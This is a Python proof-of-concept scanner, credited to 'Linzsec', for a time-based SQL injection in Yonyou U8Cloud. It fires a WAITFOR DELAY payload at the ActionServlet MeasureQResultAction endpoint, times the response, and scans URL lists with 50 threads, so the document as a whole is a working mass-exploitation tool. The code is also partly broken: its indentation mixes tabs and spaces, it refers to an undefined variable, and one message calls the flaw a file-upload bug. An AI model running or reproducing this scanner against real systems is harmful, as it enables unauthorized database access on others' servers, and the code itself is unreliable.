import argparse,sys,requests,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

proxies={
    'http':'http://127.0.0.1:7890',
    'https':'http://127.0.0.1:7890'
}
 
def main():
    banner()
    parser=argparse.ArgumentParser(description="24-U8Cloud-SQL")
    parser.add_argument('-u','--url',help="Please input your url")
    parser.add_argument('-f','--file',help="Please input your file")
    args=parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open('urls.txt','r',encoding='utf-8') as f:
            for i in f.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp=Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
 
def banner():
    a=""""
    .-..-.                               _             
: :: :                              :_;            
`.  .'.-..-. .--.  ,-.,-.     ,-.,-..-.,-.,-. .--. 
 .' ; : :; :' .; ; : ,. :     : ,. :: :: ,. :' '_.'
:_,'  `.__.'`.__,_;:_;:_;_____:_;:_;:_;:_;:_;`.__.'
                        :_____:                    
                                                   
                                    author:Linzsec
"""
    print(a)

def poc(url):
    target1 = url
    target2 = url + "/service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.query.measurequery.MeasureQResultAction&method=execute&selectQueryCondition=1%27);WAITFOR+DELAY+%270:0:5%27--"
    try:
        #记录正常请求的时间
        start_time1 = time.time()
        req1 = requests.get(target1)
        response1 = req1.text
        now_time1 = time.time() - start_time1
        print (now_time1)
        #记录POC发送的时间
        start_time2 = time.time()
        req2 = requests.get(target2)
        response2 = req2.text
        now_time2 = time.time() - start_time2
        print (now_time2)
        #print response
        #判断响应时间
        now_time = now_time2 - now_time1
        print (now_time)
        if now_time >= 4:
            print ("%s is vulnerable" %target2)
	    with open('1.txt','a+') as f1:
                   f1.write(f'{target1}\n')
                   print('[+++++++]'+target+'存在文件上传漏洞')
                   return True
        else:
            print ("%s is not vulnerable" %target2)
    except Exception as e:
        print ("Something happend....")
        print (e)
        

if __name__ == '__main__':
    main()